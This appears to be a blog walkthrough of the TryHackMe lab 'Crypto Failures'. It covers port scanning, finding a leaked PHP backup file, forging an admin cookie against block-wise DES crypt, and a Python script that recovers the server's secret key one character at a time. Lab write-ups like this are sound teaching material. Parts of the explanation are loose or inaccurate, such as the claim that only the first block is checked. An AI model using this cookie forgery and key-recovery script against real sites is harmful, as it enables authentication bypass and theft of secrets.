---
title: "TryHackMe: Crypto Failures"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_crypto_failures/
image:
  path: room_img.png
description: Implementing your own military-grade encryption is usually not the best idea.
---
Created: March 9, 2025 11:45 AM
Status: Done

# Crypto Failures

## Reconnaissance

### rust scan

```jsx
└─$ rustscan -a 10.10.182.232                        
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/neo/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.182.232:22
Open 10.10.182.232:80
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 22:49 EST
Initiating Ping Scan at 22:49
Scanning 10.10.182.232 [4 ports]
Completed Ping Scan at 22:49, 0.43s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:49
Completed Parallel DNS resolution of 1 host. at 22:49, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:49
Scanning 10.10.182.232 [2 ports]
Discovered open port 80/tcp on 10.10.182.232
Discovered open port 22/tcp on 10.10.182.232
Completed SYN Stealth Scan at 22:49, 3.04s elapsed (2 total ports)
Nmap scan report for 10.10.182.232
Host is up, received echo-reply ttl 61 (0.39s latency).
Scanned at 2025-03-08 22:49:22 EST for 3s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 60

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.62 seconds
           Raw packets sent: 7 (284B) | Rcvd: 3 (116B)

                                                      
```

### nmap -T4 -n -sC -sV -Pn -P 22 80

```jsx
─$ nmap -T4 -n -sC -sV -Pn -P 22 80 10.10.182.232
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 22:54 EST
Stats: 0:00:07 elapsed; 0 hosts completed (2 up), 2 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 3.00% done; ETC: 22:58 (0:03:46 remaining)
Stats: 0:00:07 elapsed; 0 hosts completed (2 up), 2 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 3.25% done; ETC: 22:58 (0:03:58 remaining)
Stats: 0:01:19 elapsed; 0 hosts completed (2 up), 2 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 39.00% done; ETC: 22:57 (0:02:04 remaining)
Nmap scan report for 22 (0.0.0.22)
Host is up.
All 1000 scanned ports on 22 (0.0.0.22) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 80 (0.0.0.80)
Host is up.
All 1000 scanned ports on 80 (0.0.0.80) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 10.10.182.232
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:2c:43:78:0c:d3:13:5b:8d:83:df:63:cf:53:61:91 (ECDSA)
|_  256 45:e1:3c:eb:a6:2d:d7:c6:bb:43:24:7e:02:e9:11:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Did not follow redirect to /
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 292.76 sec
```

## Enumeration

![Screenshot From 2025-03-08 22-49-25.png](img1.png)

![Screenshot From 2025-03-14 23-50-16.png](img2.png)

### it say “”TOO remember to remove .bak file …”” i think it is hint let try find the file using FFUF

### FFUF

```jsx
$ ffuf -u 'http://10.10.12.198/FUZZ' -w /usr/share/wordlists/Discovery/Web-Content/directory-list-2.3-small.txt -e .php,.php.bak -t 100 -mc all -ic -fc 404
...

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.12.198/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .php.bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6142ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7233ms]
index.php.bak           [Status: 200, Size: 1979, Words: 282, Lines: 96, Duration: 7230ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 413ms]
:: Progress: [32641/262953] :: Job [1/1] :: 290 req/sec :: Duration: [0:02:43] :: Errors: 0 :::: Progress: [100003/262953] :: Job [1/1] :: 192 req/sec :: Duration: [0:08:32] :: Errors: 0 ::: Progress: [100029/262953] :: Job [1/1] :: 194 req/sec :: Duration: [0:08:32] :: Errors: 0 ::: Progress: [100029/262953] :: Job [1/1] :: 194 req/sec :: Duration: [0:08:32] :: Errors: 0 ::: Progress: [100035/262953] :: Job [1/1] :: 180 req/sec :: Duration: [0:08:32] :: Errors: 0 ::: Progress: [100058/262953] :: Job [1/1] :: 178 req/sec :: Duration: [0:08:33] :: Error
```

### downloading the file

```jsx
$ wget http://10.10.46.169/index.php.bak
```

### cat the index.php.bak  files

```jsx
<?php
include('config.php');

function generate_cookie($user,$ENC_SECRET_KEY) {
    $SALT=generatesalt(2);
    
    $secure_cookie_string = $user.":".$_SERVER['HTTP_USER_AGENT'].":".$ENC_SECRET_KEY;

    $secure_cookie = make_secure_cookie($secure_cookie_string,$SALT);

    setcookie("secure_cookie",$secure_cookie,time()+3600,'/','',false); 
    setcookie("user","$user",time()+3600,'/','',false);
}

function cryptstring($what,$SALT){

return crypt($what,$SALT);

}

function make_secure_cookie($text,$SALT) {

$secure_cookie='';

foreach ( str_split($text,8) as $el ) {
    $secure_cookie .= cryptstring($el,$SALT);
}

return($secure_cookie);
}

function generatesalt($n) {
$randomString='';
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
for ($i = 0; $i < $n; $i++) {
    $index = rand(0, strlen($characters) - 1);
    $randomString .= $characters[$index];
}
return $randomString;
}

function verify_cookie($ENC_SECRET_KEY){

    $crypted_cookie=$_COOKIE['secure_cookie'];
    $user=$_COOKIE['user'];
    $string=$user.":".$_SERVER['HTTP_USER_AGENT'].":".$ENC_SECRET_KEY;

    $salt=substr($_COOKIE['secure_cookie'],0,2);

    if(make_secure_cookie($string,$salt)===$crypted_cookie) {
        return true;
    } else {
        return false;
    }
}

if ( isset($_COOKIE['secure_cookie']) && isset($_COOKIE['user']))  {

    $user=$_COOKIE['user'];

    if (verify_cookie($ENC_SECRET_KEY)) {
        
    if ($user === "admin") {
   
        echo 'congrats: ******flag here******. Now I want the key.';

            } else {
        
        $length=strlen($_SERVER['HTTP_USER_AGENT']);
        print "<p>You are logged in as " . $user . ":" . str_repeat("*", $length) . "\n";
	    print "<p>SSO cookie is protected with traditional military grade en<b>crypt</b>ion\n";    
    }

} else { 

    print "<p>You are not logged in\n";
   

}

}
  else {

    generate_cookie('guest',$ENC_SECRET_KEY);
    
    header('Location: /');

}
?>
```

## Web Application Analysis

![image.png](img3.png)

## Vulnerability Scanning

### use Chatgpt to analyze the action of the code

### **Vulnerability & Exploitation**

The flaw is in how the hashing works. The **first hash block** depends only on:

- **Username (`user` cookie)**
- **First part of the User-Agent (`HTTP_USER_AGENT`)**

Since hashing is **block-based**, we can change the `user` cookie to **admin**, hash the first block ourselves, and replace the first block in `secure_cookie` with the new hash.

### **Steps to Bypass Authentication**

1. Set the **user cookie** to `"admin"`.
2. Compute `crypt("admin:Mo", "Ad")` (same salt `"Ad"` as in the original cookie).
3. Replace the first hash block in `secure_cookie` with this computed value.
4. Send the modified cookies to the server.

### Since only the **first hash block** is checked explicitly, this tricks the system into logging us in as **admin**, revealing the flag.

cx0HZZBws7c2Ycx5f4SBEzEubccx8V6%2FBzT4k3McxkGAsNaCxaJ6cxYWbjFzhcHFocx%2FN6oNcyUNWccxAeuXTsGl4w2cxqQv9iwGAwoUcxoRykdkK7xkMcxI2PVdO7M4.2cx6gExPpUQJ2gcxoVfAC0GLDrEcxtZg4utIa4cMcxraWjmg.nSFYcxmlVM49a5lz2cxnj0fIICUkokcxG049WeenCU.cxpwqW91D3JQwcxw29xUd2HxwccxuIyLva73RAwcxEt9HT04QIGYcxjgRxccFCqiMcx7KQkXBesdBQcxcvUrlaAD%2Fa.cxK%2F21vLe1pWkcxbEpo1RbYp6McxSbmFsiCQp9IcxQT4UtXTP6aAcxFf7TnHS9mjA

### how it work

```jsx
function make_secure_cookie($text,$SALT) {
$secure_cookie='';
foreach ( str_split($text,8) as $el ) {
    $secure_cookie .= cryptstring($el,$SALT);
}
return($secure_cookie);
}
```

### this code cut the user agent in 13 letters like this

```jsx
cx0HZZBws7c2Y
cx5f4SBEzEubc
cx8V6%2FBzT4k3M
cxkGAsNaCxaJ6
cxYWbjFzhcHFocx%2FN6oNcyUNWccxAeuXTsGl4w2cxqQv9iwGAwoUcxoRykdkK7xkMcxI2PVdO7M4.2cx6gExPpUQJ2gcxoVfAC0GLDrEcxtZg4utIa4cMcxraWjmg.nSFYcxmlVM49a5lz2cxnj0fIICUkokcxG049WeenCU.cxpwqW91D3JQwcxw29xUd2HxwccxuIyLva73RAwcxEt9HT04QIGYcxjgRxccFCqiMcx7KQkXBesdBQcxcvUrlaAD%2Fa.cxK%2F21vLe1pWkcxbEpo1RbYp6McxSbmFsiCQp9IcxQT4UtXTP6aAcxFf7TnHS9mjA
```

```jsx
guest: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0;$ENC_SECRET_KEY
guest: Mo
 ....
 
admin: Mo

```

like this

### creating php file for encrypting the user agent for “admin”

```jsx
<?php

$string = "admin:Mo";
$salt = "cx"; #the salt for me is cx
$x = crypt($string,$salt);

echo $x;
```

### run it saying php file.php

  (   php p {.} php    )
cxPWpaVeeuG8g

## Exploit & Initial Access

input the the hash in to the burp or your browser cookies first 13 value change and the user to admin like in the image

![Screenshot From 2025-03-15 02-52-35.png](img4.png)

## Privilege Escalation

### Use this python script to get the flag

```jsx
#!/usr/bin/env python3
import requests
import urllib.parse
import string
from passlib.hash import des_crypt

BASE_URL = "http://10.10.8.11/"
USERNAME = "guest:"
SEPARATOR = ":"
CHARSET = string.printable

def get_secure_cookie(user_agent: str) -> str:
    session = requests.Session()
    response = session.get(BASE_URL, headers={"User-Agent": user_agent})
    cookie = session.cookies.get("secure_cookie")
    return urllib.parse.unquote(cookie) if cookie else ""

def main():
    discovered = ""

    while True:
        # Calculate how much padding is needed so that the prefix length is congruent to 7 modulo 8
        ua_padding_length = (7 - len(USERNAME + SEPARATOR + discovered)) % 8
        user_agent = "A" * ua_padding_length
        prefix = USERNAME + user_agent + SEPARATOR + discovered

        block_index = len(prefix) // 8

        secure_cookie = get_secure_cookie(user_agent)
        # Each block is 13 characters long in the cookie hash
        target_block = secure_cookie[block_index * 13:(block_index + 1) * 13]
        if not target_block:
            break  # No more blocks to process
        salt = target_block[:2]

        found_char = False
        for char in CHARSET:
            candidate = (prefix + char)[-8:]
            candidate_hash = des_crypt.hash(candidate, salt=salt)
            if candidate_hash == target_block:
                discovered += char
                print(char, end="", flush=True)
                found_char = True
                break

        if not found_char:
            break

    print("\nDiscovered string:", discovered)

if __name__ == "__main__":
    main()
```

```jsx
─$ python3 [p4.py](http://p4.py/)
THM{Traditiona…..  running and finish  

```
## reference for where i git the code

[https://github.com/djalilayed/tryhackme/tree/main/Crypto Failures](https://github.com/djalilayed/tryhackme/tree/main/Crypto%20Failures)
<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
